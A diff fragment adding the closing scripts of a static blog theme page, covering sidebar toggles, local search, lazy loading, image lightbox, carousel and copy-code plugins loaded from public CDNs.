+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
